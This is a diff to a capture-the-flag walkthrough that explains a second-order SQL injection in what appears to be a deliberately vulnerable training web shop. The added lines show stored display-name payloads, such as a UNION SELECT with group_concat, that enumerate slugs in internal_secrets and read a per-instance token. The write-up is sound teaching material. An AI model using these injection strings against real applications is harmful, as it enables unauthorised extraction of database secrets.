@@ -104,11 +104,23 @@ Filter by it, and the third column of the injected row lists every table:
 users,products,carts,cart_items,orders,order_items,addresses,flags,hints,revealed_hints,reviews,support_access_tokens,found_flags,project_init,visitor_logs,wishlists,wishlist_items,password_reset_tokens,supplier_orders,coupons,gift_cards,stream_config,sqlite_sequence,internal_secrets
 ```
 
-`flags` is walled off — naming it returns `403`, and any `OSS{…}` value is stripped from the response before it leaves the server. `internal_secrets` is not, and it holds one row per injection challenge, keyed by slug.
+`flags` is walled off — naming it returns `403`, and any `OSS{…}` value is stripped from the response before it leaves the server. `internal_secrets` is not.
+
+Its slugs are readable the same way, so there is nothing to guess. Store one more display name:
+
+```
+x' UNION SELECT 1, 2, group_concat(slug), 4, 5, 6 FROM internal_secrets --
+```
+
+```
+product-search-sql-injection,second-order-sql-injection,sql-injection,x-forwarded-for-sql-injection
+```
+
+One row per injection challenge, each named after the challenge it belongs to.
 
 ### Step 5: Read the canary
 
-Post one last review under this display name:
+This panel only looks for its own token. Post one last review under this display name:
 
 ```
 x' UNION SELECT 1, 2, token, 4, 5, 6 FROM internal_secrets WHERE slug='second-order-sql-injection' --
@@ -134,6 +146,8 @@ Filter by it on the moderation panel:
 ![Flag](../../assets/images/second-order-sql-injection/flag-sql.png)
 
 The token is generated when the lab is seeded, so it differs on every instance: returning it proves the stored name was executed as SQL.
+
+Dropping the `WHERE` works just as well: all four rows come back and the panel finds its own token among them. The filter keeps the response readable, it is not a requirement.
 
 ## Vulnerable code analysis
 
